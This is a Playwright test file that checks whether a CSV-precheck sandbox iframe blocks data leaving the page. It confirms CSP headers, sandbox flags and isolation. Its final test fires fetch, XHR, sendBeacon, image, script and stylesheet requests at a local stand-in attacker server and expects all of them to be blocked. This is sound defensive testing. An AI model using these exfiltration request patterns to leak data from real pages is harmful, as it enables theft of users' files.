import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { expect, test, type Frame, type Page } from "@playwright/test";

// A stand-in for an attacker's server: any request reaching it means data could leave the page.
let exfil: Server;
let exfilUrl: string;
let exfilHits: string[];

test.beforeAll(async () => {
  exfil = createServer((req, res) => {
    exfilHits.push(req.url ?? "");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.end("ok");
  });
  await new Promise<void>((resolve) => exfil.listen(0, "127.0.0.1", resolve));
  exfilUrl = `http://127.0.0.1:${(exfil.address() as AddressInfo).port}`;
});

test.afterAll(() => new Promise<void>((resolve) => exfil.close(() => resolve())));

test.beforeEach(() => {
  exfilHits = [];
});

async function sandbox(page: Page): Promise<Frame> {
  await page.goto("/csv-precheck/");
  const frame = page.frame({ url: /\/sandbox\/csv-precheck\/$/ });
  if (!frame) throw new Error("sandbox frame not found");
  await frame.waitForLoadState();
  return frame;
}

async function openCsv(frame: Frame) {
  await frame.locator("#file").setInputFiles({
    name: "accounts.csv",
    mimeType: "text/csv",
    buffer: Buffer.from("Id,Name\n001000000000001,Acme\n"),
  });
}

test("sandbox pages ship the CSP header", async ({ request }) => {
  const res = await request.get("/sandbox/csv-precheck/");
  const csp = res.headers()["content-security-policy"];
  expect(csp).toContain("connect-src 'none'");
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("frame-ancestors 'self'");
});

test("the iframe is sandboxed without same-origin access", async ({ page }) => {
  await page.goto("/csv-precheck/");
  const flags = await page.locator("iframe.sandbox-frame").getAttribute("sandbox");
  expect(flags?.split(" ").sort()).toEqual(["allow-downloads", "allow-scripts"]);
});

test("a file opened in the sandbox is processed and the report downloads", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame);
  await expect(frame.locator("#result")).toHaveText("accounts.csv: 2 lines, 29 bytes");

  const [download] = await Promise.all([
    page.waitForEvent("download"),
    frame.locator("#download").click(),
  ]);
  const body = await download.createReadStream().then(async (stream) => {
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);
    return Buffer.concat(chunks).toString();
  });
  expect(body).toBe("File: accounts.csv\nLines: 2\nBytes: 29\n");
});

test("the hosting page cannot read the sandbox document", async ({ page }) => {
  await sandbox(page);
  const access = await page.evaluate(() => {
    const iframe = document.querySelector<HTMLIFrameElement>("iframe.sandbox-frame")!;
    try {
      return iframe.contentDocument === null ? "blocked" : "readable";
    } catch {
      return "blocked";
    }
  });
  expect(access).toBe("blocked");
});

test("the sandbox cannot send anything over the network", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame);

  const outcomes = await frame.evaluate(async (target) => {
    const attempt = (p: Promise<unknown>) =>
      p.then(
        () => "sent",
        () => "blocked",
      );
    const settle = (el: HTMLElement & { onload: unknown; onerror: unknown }) =>
      new Promise<string>((resolve) => {
        el.onload = () => resolve("sent");
        el.onerror = () => resolve("blocked");
        document.body.append(el);
        setTimeout(() => resolve("blocked"), 2000);
      });

    const img = document.createElement("img");
    img.src = `${target}/img`;
    const script = document.createElement("script");
    script.src = `${target}/script`;
    const style = document.createElement("link");
    style.rel = "stylesheet";
    style.href = `${target}/style`;

    return {
      fetch: await attempt(fetch(`${target}/fetch`)),
      fetchSameOrigin: await attempt(fetch("/")),
      xhr: await new Promise<string>((resolve) => {
        const xhr = new XMLHttpRequest();
        try {
          xhr.open("GET", `${target}/xhr`);
          xhr.onload = () => resolve("sent");
          xhr.onerror = () => resolve("blocked");
          xhr.send();
        } catch {
          resolve("blocked");
        }
      }),
      beacon: navigator.sendBeacon(`${target}/beacon`, "data") ? "queued" : "blocked",
      img: await settle(img),
      script: await settle(script),
      style: await settle(style),
    };
  }, exfilUrl);

  expect(outcomes).toMatchObject({
    fetch: "blocked",
    fetchSameOrigin: "blocked",
    xhr: "blocked",
    img: "blocked",
    script: "blocked",
    style: "blocked",
  });
  // sendBeacon may report "queued" before CSP drops it; what counts is that nothing arrives.
  await page.waitForTimeout(500);
  expect(exfilHits).toEqual([]);
});
